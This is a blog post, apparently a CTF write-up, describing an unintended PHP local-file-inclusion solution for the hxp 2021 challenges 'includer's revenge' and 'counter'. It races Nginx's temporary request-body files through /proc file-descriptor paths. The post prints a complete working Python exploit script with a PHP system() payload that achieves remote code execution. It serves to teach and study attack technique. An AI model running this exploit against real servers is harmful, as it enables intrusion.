<!doctype html><html lang=en><head><meta charset=UTF-8><meta content="width=device-width,initial-scale=1.0" name=viewport><link href=https://guylewin.com/rss.xml rel=alternate title=RSS type=application/rss+xml><title>Guy Lewin's Blog | Winning the Impossible Race - An Unintended Solution for Includer's Revenge / Counter (hxp 2021)</title><link as=style href=https://guylewin.com/css/style.css rel=preload><link crossorigin href=https://raw.githack.com/Speyll/suCSS/main/reset-min.css rel=stylesheet><link crossorigin href=https://raw.githack.com/Speyll/suCSS/main/suCSS-min.css rel=stylesheet><link href=https://guylewin.com/css/style.css rel=stylesheet><link href=https://guylewin.com/css/custom.css rel=stylesheet><link href=https://guylewin.com/favicon.ico rel=icon><script src="https://www.googletagmanager.com/gtag/js?id=G-YEJ89F03YG" async></script><script>window.dataLayer = window.dataLayer || [];
            function gtag(){dataLayer.push(arguments);}
            gtag('js', new Date());

            gtag('config', 'G-YEJ89F03YG');</script><meta content="Exploiting PHP file inclusion vulnerabilities through Nginx file descriptor race conditions and ProcFS manipulation to achieve local file inclusion and remote code execution." name=description><meta content="Exploiting PHP file inclusion vulnerabilities through Nginx file descriptor race conditions and ProcFS manipulation to achieve local file inclusion and remote code execution." property=og:description><meta content="Exploiting PHP file inclusion vulnerabilities through Nginx file descriptor race conditions and ProcFS manipulation to achieve local file inclusion and remote code execution." name=twitter:description><meta content="ctf, exploit, hxp, lfi, nginx, pasten, php, unintended" name=keywords><meta content=Zola name=generator><meta content=English name=language><meta content="index, follow" name=robots><meta content="index, follow" name=googlebot><meta content=en_US property=og:locale><meta content="Guy Lewin's Blog" property=og:site_name><meta content="Guy Lewin's Blog | Winning the Impossible Race - An Unintended Solution for Includer's Revenge / Counter (hxp 2021)" property=og:title><meta content=https://guylewin.com/blog/2021-12-27-winning-the-impossible-race-an-unintended-solution-for-includers-revenge-counter-hxp-2021/ property=og:url><meta content=article property=og:type><meta content=summary_large_image name=twitter:card><meta content="Guy Lewin's Blog | Winning the Impossible Race - An Unintended Solution for Includer's Revenge / Counter (hxp 2021)" name=twitter:title><link href=https://guylewin.com/blog/2021-12-27-winning-the-impossible-race-an-unintended-solution-for-includers-revenge-counter-hxp-2021/ rel=canonical><meta content="Guy Lewin" name=author><meta content="Guy Lewin" property=og:author><meta content=2021-12-27T00:00:00Z property=article:published_time><meta content="Guy Lewin and Eyal Daniel" property=article:author><meta content=Blog property=article:section><meta content=ctf property=article:tag><meta content=exploit property=article:tag><meta content=hxp property=article:tag><meta content=lfi property=article:tag><meta content=nginx property=article:tag><meta content=pasten property=article:tag><meta content=php property=article:tag><meta content=unintended property=article:tag><script type=application/ld+json>
{
    "@context": "https://schema.org",
    "@type": "Article",
    "headline": "Winning the Impossible Race - An Unintended Solution for Includer&#x27;s Revenge &#x2F; Counter (hxp 2021)",
    
    "author": {
        "@type": "Person",
        "name": "Guy Lewin"
    },
    
    
    "datePublished": "2021-12-27",
    
    "description": "Exploiting PHP file inclusion vulnerabilities through Nginx file descriptor race conditions and ProcFS manipulation to achieve local file inclusion and remote code execution.",
    "publisher": {
        "@type": "Organization",
        "name": "Guy Lewin&#x27;s Blog"
    }
}
</script><body><nav id=nav-bar><div class=nav-social><a class=icon-link href=https://www.threads.com/@guylewin target=_blank><svg class=icon><use href=https://guylewin.com/icons.svg#threads></use></svg></a><a class=icon-link href=https://www.linkedin.com/in/guy-lewin-48b00712 target=_blank><svg class=icon><use href=https://guylewin.com/icons.svg#linkedin></use></svg></a><a class=icon-link href=https://github.com/GuyLewin target=_blank><svg class=icon><use href=https://guylewin.com/icons.svg#github></use></svg></a><a class=icon-link href=mailto:contact@guylewin.com target=_blank><svg class=icon><use href=https://guylewin.com/icons.svg#email></use></svg></a></div><div class=nav-menu><a href=/> /blog/ </a><a href=/about> /about/ </a></div><div class=nav-controls><div aria-label="Toggle theme" class=theme-toggle data-icon-base=https://guylewin.com/icons.svg data-icon-dark=#darkMode data-icon-light=#lightMode data-sound-src=https://guylewin.com/click.ogg id=theme-toggle role=button tabindex=0><svg class=icon><use id=theme-icon></use></svg></div></div></nav><main><article class=post><header class=post-header><time datetime=2021-12-27>Published on: <span class=accent-data>2021-12-27</span> </time><address rel=author>By <span class=accent-data>Guy Lewin and Eyal Daniel</span></address><h1>Winning the Impossible Race - An Unintended Solution for Includer's Revenge / Counter (hxp 2021)</h1></header><div class=post-content><p>In December 2021 Eyal Daniel and me (Guy Lewin) participated in <a href=https://2021.ctf.link/ rel=noopener target=_blank>hxp CTF 2021</a> on behalf of "<a href=https://ctftime.org/team/6965 rel=noopener target=_blank>pasten</a>" group. We found an LFI exploit relying solely on PHP including a file running alongside Nginx.<h2 id=the-challenges>The Challenges</h2><p>The recent hxp CTF brought us some great challenges, 2 of those challenges were <code>includer's revenge</code> and <code>counter</code> - hard and medium web-challenges respectively.<p>While trying to solve <code>includer's revenge</code> we managed to find an awesome and incredibly hard to exploit solution that was also working on the second challenge (<code>counter</code>). Both of these challenges are based on the <code>LFI (Local File Inclusion)</code> concept, like familiar challenges from previous years. <code>LFI</code> is a highly documented and known category of vulnerabilities and this year’s challenges are making it a bit harder to exploit than usual.<h2 id=includer-s-revenge>includer’s revenge</h2><pre class=language-php data-lang=php style=color:#fdf4c1aa;background-color:#282828><code class=language-php data-lang=php><span>&lt;?php </span><span style=color:#fdf4c1>($_GET[</span><span style=color:#b8bb26>'action'</span><span style=color:#fdf4c1>] ?? </span><span style=color:#b8bb26>'read' </span><span style=color:#fdf4c1>) </span><span style=color:#fe8019>=== </span><span style=color:#b8bb26>'read'</span><span style=color:#fdf4c1> ? </span><span style=color:#fabd2f>readfile</span><span style=color:#fdf4c1>($_GET[</span><span style=color:#b8bb26>'file'</span><span style=color:#fdf4c1>] ?? </span><span style=color:#b8bb26>'index.php'</span><span style=color:#fdf4c1>) : </span><span style=color:#fa5c4b>include_once</span><span style=color:#fdf4c1>($_GET[</span><span style=color:#b8bb26>'file'</span><span style=color:#fdf4c1>] ?? </span><span style=color:#b8bb26>'index.php'</span><span style=color:#fdf4c1>);
</span></code></pre><p>A very basic PHP endpoint that either reads a file, or includes it. The typical challenge is creating a local file on the server that contains a malicious PHP code. There are many documented methods to do this, the most naive one is simply using an existing upload mechanism in the targeted website. Given the simplicity of this challenge (the above code is the entire logic behind the target server) - we need a different kind of approach.<h2 id=environment-caches-sessions-and-what-not>Environment, Caches, Sessions and What Not</h2><p>This kind of approach takes advantage of dynamically generated files that are created in various ways using different features and situations in the underlying framework and environment. For example - inserting a log record to a running application’s log file might actually make the log file a valid PHP page! Imagine browsing to <code>/&lt;?php ... ?></code>, suddenly - the Nginx log file can be included and trigger logic controlled by the attacker.<h2 id=the-hardened-setup>The Hardened Setup</h2><p>On top of the source code - we are also given the <code>Dockerfile</code> for creating a local instance of the challenge. Below is the <code>Dockerfile</code> used in <code>includer's revenge</code>, the difference between it and <code>counter</code>‘s is irrelevant for our exploit.<pre class=language-bash data-lang=bash style=color:#fdf4c1aa;background-color:#282828><code class=language-bash data-lang=bash><span style=color:#fdf4c1>RUN chown -R root:root /var/www </span><span style=color:#fe8019>&& </span><span>\
</span><span>    </span><span style=color:#fdf4c1>find /var/www -type d -exec chmod 555 {} </span><span style=color:#b8bb26>\; </span><span style=color:#fe8019>&& </span><span>\
</span><span>    </span><span style=color:#fdf4c1>find /var/www -type f -exec chmod 444 {} </span><span style=color:#b8bb26>\; </span><span style=color:#fe8019>&& </span><span>\
</span><span>    </span><span style=color:#fdf4c1>chown -R root:root /tmp /var/tmp /var/lib/php/sessions </span><span style=color:#fe8019>&& </span><span>\
</span><span>    </span><span style=color:#fdf4c1>chmod -R 000 /tmp /var/tmp /var/lib/php/sessions
</span><span>
</span><span style=color:#fdf4c1>RUN ln -sf /dev/stdout /var/log/nginx/access.log </span><span style=color:#fe8019>&& </span><span>\
</span><span>    </span><span style=color:#fdf4c1>ln -sf /dev/stderr /var/log/nginx/error.log
</span><span>
</span><span style=color:#fdf4c1>RUN find / -ignore_readdir_race -type f </span><span style=color:#b8bb26>\(</span><span style=color:#fdf4c1> -perm -4000 -o -perm -2000 </span><span style=color:#b8bb26>\)</span><span style=color:#fdf4c1> -not -wholename /readflag -delete
</span></code></pre><p>We notice several things when looking at the file. PHP doesn’t have permissions to write into its sessions directory, which prevents us from setting a PHP session with malicious code into a session file. In addition, when PHP creates temporary files (for buffering, or <code>php://temp</code> for example) it runs the <code>php_get_temporary_directory()</code> function to resolve the temp directory. Sadly, in this setup the result is always <code>/tmp</code>. Since PHP can’t write into it (see <code>Dockerfile</code> above) - we didn’t go in this direction.<p>On top of that - Nginx’s log files are redirected to <code>stdout</code> and <code>stderr</code> which means that there are no logs on the filesystem (i.e. we can’t use Nginx access / errors to write malicious code into a file).<h2 id=ignoring-the-obvious>Ignoring the Obvious</h2><p>When you’re doing enough challenges, you learn to spot the important parts of the challenge - the little clues that are right in front of you, the configuration that should not be there, the misplaced <code>"</code>, the unusual choice of words in the description.<pre class=language-php data-lang=php style=color:#fdf4c1aa;background-color:#282828><code class=language-php data-lang=php><span>... readfile($_GET['file'] ?? 'index.php') : include_once($_GET['file'] ...
</span></code></pre><p>The challenge consists of two major parts - <code>readfile()</code> and <code>include_once()</code>. At first sight, it seems like we were meant to leverage <code>readfile()</code> for somehow placing a file and <code>include_once()</code> to execute it. Having said that, completely aware of the path we’re supposed to walk in, we chose to go in a completely different way.<h2 id=the-pasten-way>The Pasten Way</h2><p>There is nothing like solving a challenge in an unintended way! Trying to find different types of dynamic files, we decided to look into Nginx as a target. The first Google result for <code>"nginx tempfile"</code> was actually a breakthrough, revealing Nginx <strong>does</strong> create temporary files (mainly because people were complaining about permission errors).<p>When we read more about it, we found the following documentation:<pre style=color:#fdf4c1aa;background-color:#282828><code><span>client_body_buffer_size:
</span><span>Sets buffer size for reading client request body. In case the request body is larger than the buffer, the whole body or only its part is written to a temporary file. By default, buffer size is equal to two memory pages. This is 8K on x86, other 32-bit platforms, and x86-64. It is usually 16K on other 64-bit platforms.
</span></code></pre><p>Sound good doesn’t it? Testing this behavior was a little tricky since we never actually saw these files on the filesystem. This behavior can be easily explained when looking at the relevant source code in Nginx:<pre class=language-c data-lang=c style=color:#fdf4c1aa;background-color:#282828><code class=language-c data-lang=c><span style=color:#fdf4c1>ngx_open_tempfile(</span><span style=color:#fabd2f>u_char </span><span style=color:#fe8019>*</span><span style=color:#fdf4c1>name, ngx_uint_t persistent, ngx_uint_t access)
</span><span>{
</span><span>    ngx_fd_t  fd;
</span><span>
</span><span>    fd </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>open((</span><span style=color:#fa5c4b>const char </span><span style=color:#fe8019>*</span><span style=color:#fdf4c1>) name, O_CREAT</span><span style=color:#fe8019>|</span><span style=color:#fdf4c1>O_EXCL</span><span style=color:#fe8019>|</span><span style=color:#fdf4c1>O_RDWR,
</span><span style=color:#fdf4c1>              access </span><span style=color:#fe8019>?</span><span style=color:#fdf4c1> access </span><span style=color:#fe8019>: </span><span style=color:#d3869b>0600</span><span style=color:#fdf4c1>)</span><span>;
</span><span>
</span><span>    </span><span style=color:#fa5c4b>if </span><span>(fd </span><span style=color:#fe8019>!= -</span><span style=color:#d3869b>1 </span><span style=color:#fe8019>&& !</span><span>persistent) {
</span><span>        (</span><span style=color:#fa5c4b>void</span><span>) </span><span style=color:#fdf4c1>unlink((</span><span style=color:#fa5c4b>const char </span><span style=color:#fe8019>*</span><span style=color:#fdf4c1>) name)</span><span>;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#fa5c4b>return</span><span> fd;
</span><span>}
</span></code></pre><p>As you can see, the temporary file is created, then <strong>immediately</strong> deleted! This is a hell of a race to win. Nevertheless we decided to go for it.<p>The temporary file name will be a (10 digit 0-padded) sequential number that isn’t really predictable (it’s directly based on the number of previously handled buffered bodies at the time the request is processed).<p>Luckily - we can use <code>/proc/&lt;nginx worker pid>/fd/&lt;fd></code> to access these files through the open file descriptors of the Nginx worker processes! In order to easily test this behavior we simply generated a request that is larger than <code>16K</code> and made sure to keep the request going - sending the data byte by byte to leave the <code>fd</code> open.<p>The weird thing about file descriptors in procfs is that they (in a way) behave both as symlinks and hardlinks. If a file was deleted while a process holds an open file descriptor:<ul><li><code>realpath()</code> will return the last path of the file with <code>" (deleted)"</code> appended to it.<li><code>open()</code> will return an <code>fd</code> that can be used to read the original file content.</ul><p>Using this method we could potentially use the Nginx file descriptor to access the temporary file and include its content (which is completely controlled by us).<p>Unfortunately, PHP identifies the file descriptor as a symlink and thus attempts to resolve it’s link, as shown in the <code>php-core</code> snippet below:<pre class=language-c data-lang=c style=color:#fdf4c1aa;background-color:#282828><code class=language-c data-lang=c><span style=color:#fe8019>...
</span><span style=color:#fa5c4b>if </span><span>(</span><span style=color:#fe8019>++</span><span>(</span><span style=color:#fe8019>*</span><span>ll) </span><span style=color:#fe8019>></span><span> LINK_MAX </span><span style=color:#fe8019>|| </span><span>(j </span><span style=color:#fe8019>= </span><span>(</span><span style=color:#fabd2f>size_t</span><span>)</span><span style=color:#fdf4c1>php_sys_readlink(tmp, path, MAXPATHLEN)</span><span>) </span><span style=color:#fe8019>== </span><span>(</span><span style=color:#fabd2f>size_t</span><span>)</span><span style=color:#fe8019>-</span><span style=color:#d3869b>1</span><span>) {
</span><span>	</span><span style=color:#fe8019>...    
</span><span>}
</span></code></pre><p>This means that PHP has to resolve the link and open the file between the creation and deletion of the temporary file by Nginx (which, as shown above, is literally 2 lines of code apart).<p>So, the optimists will claim that a race is a race and it’s always exploitable (and they will be right!). Sadly, it’s not that easy.<p>While attempting to exploit, we noticed that after resolving a link - PHP caches the resolution by default.<p><img alt src=/images/posts/winning-the-impossible-race-an-unintended-solution-for-includers-revenge-counter-hxp-2021/1.png><p>This is important because realistically, we will fail <em>many</em> times before winning the Nginx open + delete race. If we loop through every file descriptor number before succeeding, we are inserting the broken links to the cache and thus preventing us from accessing this file descriptor number again. When PHP resolves a link to a deleted file, it puts its path + <code>" (deleted)"</code> in the cache, and will not try to resolve it again until the TTL or the cache size has been exceeded.<p>To overcome this "feature" we decided to implement a straightforward bypass. Instead of attempting to access the same path over and over (through <code>/proc/&lt;nginx worker pid>/fd/&lt;fd></code>) we thought about using a simple trick to access it in countless different ways:<p>If we could find multiple different paths that link to the root directory, we can use them to build unique paths to our file descriptors.<p>Even though <code>/proc/&lt;some nginx worker pid>/root/proc/&lt;nginx worker pid>/fd/&lt;fd></code> and <code>/proc/&lt;nginx worker pid>/fd/&lt;fd></code> resolve to the same path - adding the randomly generated prefixes makes the PHP realpath cache irrelevant. We use a random amount of <code>/proc/&lt;some nginx pid>/root</code> and <code>/proc/&lt;some nginx pid>/cwd</code> as components to build the path prefix since they all lead to <code>/</code>.<p>This method is unique and is based on the underlying filesystem and operating system - making it harder to mitigate and patch.<p>Equipped with these strategies we tried to retrieve the flag and after about 3~ minutes we consistently managed to <code>include_once()</code> the temporary file that contains our malicious payload in <code>includer's revenge</code>!<h2 id=exploit-implementation>Exploit Implementation</h2><p>We’ve used the following Python script to solve <code>includer's revenge</code> (and a slightly modified version for <code>counter</code>):<pre class=language-python data-lang=python style=color:#fdf4c1aa;background-color:#282828><code class=language-python data-lang=python><span style=color:#fa5c4b>import </span><span>requests
</span><span style=color:#fa5c4b>import </span><span>threading
</span><span style=color:#fa5c4b>import </span><span>multiprocessing
</span><span style=color:#fa5c4b>import </span><span>threading
</span><span style=color:#fa5c4b>import </span><span>random
</span><span>
</span><span style=color:#fdf4c1>SERVER </span><span style=color:#fe8019>= </span><span style=color:#b8bb26>"http://localhost:8088"
</span><span style=color:#fdf4c1>NGINX_PIDS_CACHE </span><span style=color:#fe8019>= </span><span style=color:#fabd2f>set</span><span style=color:#fdf4c1>([</span><span style=color:#d3869b>34</span><span style=color:#fdf4c1>, </span><span style=color:#d3869b>35</span><span style=color:#fdf4c1>, </span><span style=color:#d3869b>36</span><span style=color:#fdf4c1>, </span><span style=color:#d3869b>37</span><span style=color:#fdf4c1>, </span><span style=color:#d3869b>38</span><span style=color:#fdf4c1>, </span><span style=color:#d3869b>39</span><span style=color:#fdf4c1>, </span><span style=color:#d3869b>40</span><span style=color:#fdf4c1>, </span><span style=color:#d3869b>41</span><span style=color:#fdf4c1>])
</span><span style=color:#928374;font-style:italic># Set the following to True to use the above set of PIDs instead of scanning:
</span><span style=color:#fdf4c1>USE_NGINX_PIDS_CACHE </span><span style=color:#fe8019>= </span><span style=color:#d3869b>False
</span><span>
</span><span style=color:#fa5c4b>def </span><span style=color:#8ec07c>create_requests_session</span><span>():
</span><span>    session </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>requests.Session()
</span><span>    </span><span style=color:#928374;font-style:italic># Create a large HTTP connection pool to make HTTP requests as fast as possible without TCP handshake overhead
</span><span>    adapter </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>requests.adapters.HTTPAdapter(pool_connections</span><span style=color:#fe8019>=</span><span style=color:#d3869b>1000</span><span style=color:#fdf4c1>, pool_maxsize</span><span style=color:#fe8019>=</span><span style=color:#d3869b>10000</span><span style=color:#fdf4c1>)
</span><span>    </span><span style=color:#fdf4c1>session.mount(</span><span style=color:#b8bb26>'http://'</span><span style=color:#fdf4c1>, adapter)
</span><span>    </span><span style=color:#fa5c4b>return </span><span>session
</span><span>
</span><span style=color:#fa5c4b>def </span><span style=color:#8ec07c>get_nginx_pids</span><span>(</span><span style=color:#fdf4c1>requests_session</span><span>):
</span><span>    </span><span style=color:#fa5c4b>if </span><span style=color:#fdf4c1>USE_NGINX_PIDS_CACHE</span><span>:
</span><span>        </span><span style=color:#fa5c4b>return </span><span style=color:#fdf4c1>NGINX_PIDS_CACHE
</span><span>    nginx_pids </span><span style=color:#fe8019>= </span><span style=color:#fabd2f>set</span><span style=color:#fdf4c1>()
</span><span>    </span><span style=color:#928374;font-style:italic># Scan up to PID 200
</span><span>    </span><span style=color:#fa5c4b>for </span><span>i </span><span style=color:#fa5c4b>in </span><span style=color:#fabd2f>range</span><span style=color:#fdf4c1>(</span><span style=color:#d3869b>1</span><span style=color:#fdf4c1>, </span><span style=color:#d3869b>200</span><span style=color:#fdf4c1>)</span><span>:
</span><span>        cmdline </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>requests_session.get(SERVER </span><span style=color:#fe8019>+ </span><span style=color:#fa5c4b>f</span><span style=color:#b8bb26>"/?action=read&file=/proc/</span><span style=color:#fdf4c1>{i}</span><span style=color:#b8bb26>/cmdline"</span><span style=color:#fdf4c1>)</span><span>.text
</span><span>        </span><span style=color:#fa5c4b>if </span><span style=color:#fdf4c1>cmdline.startswith(</span><span style=color:#b8bb26>"nginx: worker process"</span><span style=color:#fdf4c1>)</span><span>:
</span><span>            </span><span style=color:#fdf4c1>nginx_pids.add(i)
</span><span>    </span><span style=color:#fa5c4b>return </span><span>nginx_pids
</span><span>
</span><span style=color:#fa5c4b>def </span><span style=color:#8ec07c>send_payload</span><span>(</span><span style=color:#fdf4c1>requests_session</span><span>, </span><span style=color:#fdf4c1>body_size</span><span style=color:#fe8019>=</span><span style=color:#d3869b>1024000</span><span>):
</span><span>    </span><span style=color:#fa5c4b>try</span><span>:
</span><span>        </span><span style=color:#928374;font-style:italic># The file path (/bla) doesn't need to exist - we simply need to upload a large body to Nginx and fail fast
</span><span>        payload </span><span style=color:#fe8019>= </span><span style=color:#b8bb26>'&lt;?php system("/readflag"); ?> //'
</span><span>        </span><span style=color:#fdf4c1>requests_session.post(SERVER </span><span style=color:#fe8019>+ </span><span style=color:#b8bb26>"/?action=read&file=/bla"</span><span style=color:#fdf4c1>, data</span><span style=color:#fe8019>=</span><span style=color:#fdf4c1>(payload </span><span style=color:#fe8019>+ </span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>"a" </span><span style=color:#fe8019>* </span><span style=color:#fdf4c1>(body_size </span><span style=color:#fe8019>- </span><span style=color:#fabd2f>len</span><span style=color:#fdf4c1>(payload)))))
</span><span>    </span><span style=color:#fa5c4b>except</span><span>:
</span><span>        </span><span style=color:#fa5c4b>pass
</span><span>
</span><span style=color:#fa5c4b>def </span><span style=color:#8ec07c>send_payload_worker</span><span>(</span><span style=color:#fdf4c1>requests_session</span><span>):
</span><span>    </span><span style=color:#fa5c4b>while </span><span style=color:#d3869b>True</span><span>:
</span><span>        </span><span style=color:#fdf4c1>send_payload(requests_session)
</span><span>
</span><span style=color:#fa5c4b>def </span><span style=color:#8ec07c>send_payload_multiprocess</span><span>(</span><span style=color:#fdf4c1>requests_session</span><span>):
</span><span>    </span><span style=color:#928374;font-style:italic># Use all CPUs to send the payload as request body for Nginx
</span><span>    </span><span style=color:#fa5c4b>for </span><span style=color:#fdf4c1>_ </span><span style=color:#fa5c4b>in </span><span style=color:#fabd2f>range</span><span style=color:#fdf4c1>(multiprocessing.cpu_count())</span><span>:
</span><span>        p </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>multiprocessing.Process(target</span><span style=color:#fe8019>=</span><span style=color:#fdf4c1>send_payload_worker, args</span><span style=color:#fe8019>=</span><span style=color:#fdf4c1>(requests_session,))
</span><span>        </span><span style=color:#fdf4c1>p.start()
</span><span>
</span><span style=color:#fa5c4b>def </span><span style=color:#8ec07c>generate_random_path_prefix</span><span>(</span><span style=color:#fdf4c1>nginx_pids</span><span>):
</span><span>    </span><span style=color:#928374;font-style:italic># This method creates a path from random amount of ProcFS path components. A generated path will look like /proc/&lt;nginx pid 1>/cwd/proc/&lt;nginx pid 2>/root/proc/&lt;nginx pid 3>/root
</span><span>    path </span><span style=color:#fe8019>= </span><span style=color:#b8bb26>""
</span><span>    component_num </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>random.randint(</span><span style=color:#d3869b>0</span><span style=color:#fdf4c1>, </span><span style=color:#d3869b>10</span><span style=color:#fdf4c1>)
</span><span>    </span><span style=color:#fa5c4b>for </span><span style=color:#fdf4c1>_ </span><span style=color:#fa5c4b>in </span><span style=color:#fabd2f>range</span><span style=color:#fdf4c1>(component_num)</span><span>:
</span><span>        pid </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>random.choice(nginx_pids)
</span><span>        </span><span style=color:#fa5c4b>if </span><span style=color:#fdf4c1>random.randint(</span><span style=color:#d3869b>0</span><span style=color:#fdf4c1>, </span><span style=color:#d3869b>1</span><span style=color:#fdf4c1>) </span><span style=color:#fe8019>== </span><span style=color:#d3869b>0</span><span>:
</span><span>            path </span><span style=color:#fe8019>+= </span><span style=color:#fa5c4b>f</span><span style=color:#b8bb26>"/proc/</span><span>{</span><span style=color:#fdf4c1>pid</span><span>}</span><span style=color:#b8bb26>/cwd"
</span><span>        </span><span style=color:#fa5c4b>else</span><span>:
</span><span>            path </span><span style=color:#fe8019>+= </span><span style=color:#fa5c4b>f</span><span style=color:#b8bb26>"/proc/</span><span>{</span><span style=color:#fdf4c1>pid</span><span>}</span><span style=color:#b8bb26>/root"
</span><span>    </span><span style=color:#fa5c4b>return </span><span>path
</span><span>
</span><span style=color:#fa5c4b>def </span><span style=color:#8ec07c>read_file</span><span>(</span><span style=color:#fdf4c1>requests_session</span><span>, </span><span style=color:#fdf4c1>nginx_pid</span><span>, </span><span style=color:#fdf4c1>fd</span><span>, </span><span style=color:#fdf4c1>nginx_pids</span><span>):
</span><span>    nginx_pid_list </span><span style=color:#fe8019>= </span><span style=color:#fabd2f>list</span><span style=color:#fdf4c1>(nginx_pids)
</span><span>    </span><span style=color:#fa5c4b>while </span><span style=color:#d3869b>True</span><span>:
</span><span>        path </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>generate_random_path_prefix(nginx_pid_list)
</span><span>        path </span><span style=color:#fe8019>+= </span><span style=color:#fa5c4b>f</span><span style=color:#b8bb26>"/proc/</span><span>{</span><span style=color:#fdf4c1>nginx_pid</span><span>}</span><span style=color:#b8bb26>/fd/</span><span>{</span><span style=color:#fdf4c1>fd</span><span>}</span><span style=color:#b8bb26>"
</span><span>        </span><span style=color:#fa5c4b>try</span><span>:
</span><span>            d </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>requests_session.get(SERVER </span><span style=color:#fe8019>+ </span><span style=color:#fa5c4b>f</span><span style=color:#b8bb26>"/?action=include&file=</span><span style=color:#fdf4c1>{path}</span><span style=color:#b8bb26>"</span><span style=color:#fdf4c1>)</span><span>.text
</span><span>        </span><span style=color:#fa5c4b>except</span><span>:
</span><span>            </span><span style=color:#fa5c4b>continue
</span><span>        </span><span style=color:#928374;font-style:italic># Flags are formatted as hxp{&lt;flag>}
</span><span>        </span><span style=color:#fa5c4b>if </span><span style=color:#b8bb26>"hxp" </span><span style=color:#fe8019>in </span><span>d:
</span><span>            </span><span style=color:#fabd2f>print</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>"Found flag! "</span><span style=color:#fdf4c1>)
</span><span>            </span><span style=color:#fabd2f>print</span><span style=color:#fdf4c1>(d)
</span><span>
</span><span style=color:#fa5c4b>def </span><span style=color:#8ec07c>read_file_worker</span><span>(</span><span style=color:#fdf4c1>requests_session</span><span>, </span><span style=color:#fdf4c1>nginx_pid</span><span>, </span><span style=color:#fdf4c1>nginx_pids</span><span>):
</span><span>    </span><span style=color:#928374;font-style:italic># Scan Nginx FDs between 10 - 45 in a loop. Since files and sockets keep closing - it's very common for the request body FD to open within this range
</span><span>    </span><span style=color:#fa5c4b>for </span><span>fd </span><span style=color:#fa5c4b>in </span><span style=color:#fabd2f>range</span><span style=color:#fdf4c1>(</span><span style=color:#d3869b>10</span><span style=color:#fdf4c1>, </span><span style=color:#d3869b>45</span><span style=color:#fdf4c1>)</span><span>:
</span><span>        thread </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>threading.Thread(target </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>read_file, args </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>(requests_session, nginx_pid, fd, nginx_pids))
</span><span>        </span><span style=color:#fdf4c1>thread.start()
</span><span>
</span><span style=color:#fa5c4b>def </span><span style=color:#8ec07c>read_file_multiprocess</span><span>(</span><span style=color:#fdf4c1>requests_session</span><span>, </span><span style=color:#fdf4c1>nginx_pids</span><span>):
</span><span>    </span><span style=color:#fa5c4b>for </span><span>nginx_pid </span><span style=color:#fa5c4b>in </span><span>nginx_pids:
</span><span>        p </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>multiprocessing.Process(target</span><span style=color:#fe8019>=</span><span style=color:#fdf4c1>read_file_worker, args</span><span style=color:#fe8019>=</span><span style=color:#fdf4c1>(requests_session, nginx_pid, nginx_pids))
</span><span>        </span><span style=color:#fdf4c1>p.start()
</span><span>
</span><span style=color:#fa5c4b>if </span><span style=color:#fabd2f>__name__ </span><span style=color:#fe8019>== </span><span style=color:#b8bb26>"__main__"</span><span>:
</span><span>    </span><span style=color:#fabd2f>print</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>'[DEBUG] Creating requests session'</span><span style=color:#fdf4c1>)
</span><span>    requests_session </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>create_requests_session()
</span><span>    </span><span style=color:#fabd2f>print</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>'[DEBUG] Getting Nginx pids'</span><span style=color:#fdf4c1>)
</span><span>    nginx_pids </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>get_nginx_pids(requests_session)
</span><span>    </span><span style=color:#fabd2f>print</span><span style=color:#fdf4c1>(</span><span style=color:#fa5c4b>f</span><span style=color:#b8bb26>'[DEBUG] Nginx pids: </span><span style=color:#fdf4c1>{nginx_pids}</span><span style=color:#b8bb26>'</span><span style=color:#fdf4c1>)
</span><span>    </span><span style=color:#fabd2f>print</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>'[DEBUG] Starting payload sending'</span><span style=color:#fdf4c1>)
</span><span>    </span><span style=color:#fdf4c1>send_payload_multiprocess(requests_session)
</span><span>    </span><span style=color:#fabd2f>print</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>'[DEBUG] Starting fd readers'</span><span style=color:#fdf4c1>)
</span><span>    </span><span style=color:#fdf4c1>read_file_multiprocess(requests_session, nginx_pids)
</span></code></pre><p>Our exploit tries to get PHP to <code>include_once()</code> Nginx’s request body temporary file before it’s deleted. In order to do that, we need to constantly create many HTTP requests with our payload as a (large) request body, as fast as possible.<p>We use a <code>requests.Session</code> object with a large pool configured in order to speed up our HTTP requests and reduce the TCP handshake overhead.<p>Afterwards, we loop over the processes to see which ones are Nginx workers, since we’ll need their PIDs to build the FD path leading to the request body files.<p>After creating the session and retrieving the Nginx worker PIDs (if cache wasn’t used) - we run the main exploit logic in parallel by leveraging Python’s <code>multiprocessing</code> (threads might won’t be enough in this case due to GIL):<ul><li>We create a subprocess per CPU (in <code>send_payload_multiprocess()</code>) and use that to constantly (<code>while True</code>) send HTTP requests with a large request body containing our PHP payload (<code>system("/runflag")</code> for these challenges). We used (nearly) 1MB payloads but anything between 16KB - 1MB should work (Nginx rejects request bodies larger than 1MB by default). The number of CPUs is crucial here since we need to create files fast enough to win the race.<li>We create a subprocess per Nginx worker with a thread for every FD (between 10 - 45). Each thread triggers the PHP <code>include_once()</code> for <code>/proc/&lt;nginx worker pid>/fd/&lt;fd></code>, while adding a randomly-generated prefix of chained paths as described above.</ul><h2 id=winning-the-race>Winning the Race</h2><p>The code in the implementation above worked pretty quickly on <code>includer's revenge</code> both locally and on the remote server. But when running against <code>counter</code> - we couldn’t get it to work remotely. The following code is taken from <code>counter</code>‘s server:<pre class=language-php data-lang=php style=color:#fdf4c1aa;background-color:#282828><code class=language-php data-lang=php><span>file_put_contents($page, file_get_contents($page) + 1);
</span><span>include_once($page);
